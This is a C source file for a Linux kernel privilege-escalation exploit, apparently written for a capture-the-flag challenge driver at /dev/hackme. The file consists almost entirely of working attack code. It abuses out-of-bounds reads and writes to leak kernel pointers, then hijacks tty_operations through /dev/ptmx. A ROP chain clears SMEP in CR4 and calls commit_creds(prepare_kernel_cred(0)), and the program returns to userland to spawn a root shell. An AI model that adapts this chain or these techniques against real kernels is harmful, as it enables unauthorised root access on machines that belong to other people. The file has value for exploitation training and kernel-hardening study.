#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

typedef long long LL;
typedef unsigned long long ULL;

typedef struct {
    unsigned int idx;
    int padding;
    char *user_ptr;
    LL size;
    LL offset;
} arg_struct;

#define PAUSE do { scanf("%*c"); } while(0);

// Gadget that needs to adjust
#define KERNEL_TEXT 0
#define POP_RCX 1
#define MOV_RDI_RAX_CALL_RCX_POP_RBP 2
#define RET 3
#define PUSH_RAX_POP_RSP_POP_RBP 4
#define POP_RDI 5
#define COMMIT_CREDS 6
#define PREPARE_KERNEL_CRED 7
#define SWAPGS_POPFQ_POP_RBP 8
#define IRETQ 9
#define POP_RBP 10
#define MOV_CR4_RAX_PUSH_RCX_POPFQ_POP_RBP 11
#define POP_RAX 12
#define POP_R12_R15 13

ULL gadgets[] = {
    0xffffffff81000000,
    0xffffffff81633ad8,
    0xffffffff810a1f77,
    0xffffffff810001cc,
    0xffffffff8116b3c5,
    0xffffffff81033de0,
    0xffffffff8104d220,
    0xffffffff8104d3d0,
    0xffffffff81200c2e,
    0xffffffff81019356,
    0xffffffff810003af,
    0xffffffff8100252b,
    0xffffffff8101b5a1,
    0xffffffff81033ddd,
};

unsigned long user_cs, user_ss, user_eflags, user_sp;
void save_stats() {
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %3\n"
            "pushfq\n"
            "popq %2\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
            :
            : "memory"
    );
}

void get_shell(void) {
    system("/bin/sh");
}

void create_pool(int fd, int idx, char *from, LL size)
{
    int ret;
    arg_struct arg;
    arg.idx = idx;
    arg.user_ptr = from;
    arg.size = size;
    ret = ioctl(fd, 0x30000, &arg);
    if (ret) {
        printf("[x] create_pool: %d\n", ret);
    }
}

void free_pool(int fd, int idx)
{
    int ret;
    arg_struct arg;
    arg.idx = idx;
    ret = ioctl(fd, 0x30001, &arg);
    if (ret) {
        printf("[x] free_pool: %d\n", ret);
    }
}

void write_pool(int fd, int idx, LL to_offset, char *from, LL size)
{
    int ret;
    arg_struct arg;
    arg.idx = idx;
    arg.offset = to_offset;
    arg.user_ptr = from;
    arg.size = size;
    ret = ioctl(fd, 0x30002, &arg);
    if (ret) {
        printf("[x] write_pool: %d\n", ret);
    }
}

void read_pool(int fd, int idx, char *to, LL from_offset, LL size)
{
    int ret;
    arg_struct arg;
    arg.idx = idx;
    arg.offset = from_offset;
    arg.user_ptr = to;
    arg.size = size;
    ret = ioctl(fd, 0x30003, &arg);
    if (ret) {
        printf("[x] read_pool: %d\n", ret);
    }
}

typedef ULL (*funcp)(ULL);
void get_root(void)
{
    funcp prepare_kernel_cred = (funcp)gadgets[PREPARE_KERNEL_CRED];
    funcp commit_creds = (funcp)gadgets[COMMIT_CREDS];

    // Get ROOOOOOT
    commit_creds(prepare_kernel_cred(0));
}

int main(void)
{
    int fd, victim_id, fd_tty;
    char buf[0x400];
    char buf2[0x400];
    char recv_buf[0x400] = { 0 };
    char *slab_pointer;
    char *kernel_text;
    ULL *ullp;
   
    save_stats();

    memset(buf, 0x87, 0x400);
    memset(buf2, 0x10, 0x400);

    fd = open("/dev/hackme", O_RDONLY);

    victim_id = 0;

    create_pool(fd, victim_id, buf, 0x400);
    create_pool(fd, victim_id + 1, buf, 0x400);

    // Validate
    // read_pool(fd, victim_id, recv_buf, 0, 0x400);
    // for (int i = 0; i < (0x400 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }

    // Overwrite previous pool
    write_pool(fd, victim_id + 1, -0x400, buf2, 0x400);

    // Validate
    // read_pool(fd, victim_id, recv_buf, 0, 0x400);
    // for (int i = 0; i < (0x400 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }
    
    // Free previous pool :)
    free_pool(fd, victim_id);

    // Leak SLAB pointer
    read_pool(fd, victim_id + 1, recv_buf, -0x400, 0x400);
    // for (int i = 0; i < (0x400 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }
    slab_pointer = (char *)((ULL *)recv_buf)[0];
    printf("[*] SLAB pointer: %p\n", slab_pointer);
    
    // Allocate tty_struct
    fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);

    // Leak kernel text pointer
    read_pool(fd, victim_id + 1, recv_buf, -0x400, 0x400);
    // for (int i = 0; i < (0x400 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }
    kernel_text = (char *)(((ULL *)recv_buf)[3] - 0x625d80);
    printf("[*] Kernel text pointer: %p\n", kernel_text);

    for (int i = 1; i < sizeof(gadgets) / sizeof(ULL); ++i) {
        gadgets[i] = gadgets[i] - gadgets[0] + (ULL)kernel_text;
    }

    printf("[*] First gadget: %p\n", (char *)gadgets[PUSH_RAX_POP_RSP_POP_RBP]);
    printf("[*] Problem gadget: %p\n", (char *)gadgets[PREPARE_KERNEL_CRED]);
    printf("[*] Problem get_root: %p\n", (char *)get_root);

    // PAUSE;

    // Overwrite tty_operations
    ullp = (ULL *)recv_buf;
    ullp[3] = (ULL)(slab_pointer - 0x400);
    write_pool(fd, victim_id + 1, -0x400, (char *)ullp, 0x400);

    // Validate
    // read_pool(fd, victim_id + 1, recv_buf, -0x400, 0x400);
    // for (int i = 0; i < (0x80 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }

    // Prepare fake tty_operations & ROP chain
    ullp = (ULL *)buf2;
    // tty_operations
    ullp[7] = gadgets[PUSH_RAX_POP_RSP_POP_RBP];
    // ROP chain
    int i = 1;
    ullp[i++] = gadgets[POP_RAX];
    ullp[i++] = 0x6b0;
    ullp[i++] = gadgets[MOV_CR4_RAX_PUSH_RCX_POPFQ_POP_RBP];
    ullp[i++] = 0;
    ullp[i++] = gadgets[POP_R12_R15];
    ullp[i++] = 0;
    i = 8;
    ullp[i++] = (ULL)get_root;
    ullp[i++] = gadgets[SWAPGS_POPFQ_POP_RBP];
    ullp[i++] = 0;
    ullp[i++] = 0;
    ullp[i++] = gadgets[IRETQ];
    ullp[i++] = (ULL)get_shell;
    ullp[i++] = user_cs;
    ullp[i++] = user_eflags;
    ullp[i++] = user_sp;
    ullp[i++] = user_ss;

    write_pool(fd, victim_id + 1, 0, buf2, 0x400); 

    // Validate
    // read_pool(fd, victim_id + 1, recv_buf, 0, 0x400);
    // for (int i = 0; i < (0x80 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }
    
    // Invoke
    write(fd_tty, buf, 0x10);
}
